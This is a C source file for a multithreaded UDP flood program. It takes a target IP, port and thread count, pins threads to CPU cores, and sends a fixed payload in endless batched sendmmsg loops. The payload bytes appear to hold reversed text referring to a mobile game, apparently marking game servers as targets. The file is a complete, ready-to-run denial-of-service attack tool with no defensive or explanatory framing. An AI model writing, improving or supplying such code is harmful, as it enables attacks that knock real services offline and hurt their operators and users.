#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <sched.h>    // For CPU affinity
#include <fcntl.h>    // For non-blocking sockets
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>

#define PAYLOAD_SIZE 44
#define BATCH_SIZE 100

char *ip;
int port, threads;

void set_cpu_affinity(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    // Set CPU affinity for the calling thread
    sched_setaffinity(pthread_self(), sizeof(cpu_set_t), &cpuset);
}

void *run(void *arg) {
    int core_id = *((int *)arg);
    set_cpu_affinity(core_id);

    unsigned char data[PAYLOAD_SIZE] = {
        0x01, 0x71, 0xe9, 0xa8, 0x0e, 0xc2, 0x49, 0x8d, 0x4d, 0x7c, 0x33, 0x0e, 0xf0, 0x08, 0x2e, 0x61,
        0x62, 0x6f, 0x6d, 0x20, 0x54, 0x53, 0x45, 0x62, 0x20, 0x45, 0x48, 0x74, 0x2e, 0x53, 0x44, 0x4e,
        0x45, 0x47, 0x45, 0x6c, 0x20, 0x45, 0x4c, 0x49, 0x42, 0x4f, 0x6d, 0x01
    };

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Set the socket to non-blocking mode
    fcntl(sock, F_SETFL, O_NONBLOCK);

    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iov[BATCH_SIZE];
    for (int i = 0; i < BATCH_SIZE; i++) {
        memset(&msgs[i], 0, sizeof(struct mmsghdr));
        iov[i].iov_base = data;
        iov[i].iov_len = sizeof(data);
        msgs[i].msg_hdr.msg_iov = &iov[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &server_addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(server_addr);
    }

    while (1) {
        int sent_packets = sendmmsg(sock, msgs, BATCH_SIZE, 0);
        if (sent_packets < 0) {
            perror("Batch send failed");
        }
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <THREADS>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    threads = atoi(argv[3]);

    pthread_t thread_ids[threads];
    int core_ids[threads];

    for (int i = 0; i < threads; i++) {
        core_ids[i] = i;
        if (pthread_create(&thread_ids[i], NULL, run, &core_ids[i]) != 0) {
            perror("Failed to create thread");
            exit(EXIT_FAILURE);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    return 0;
}
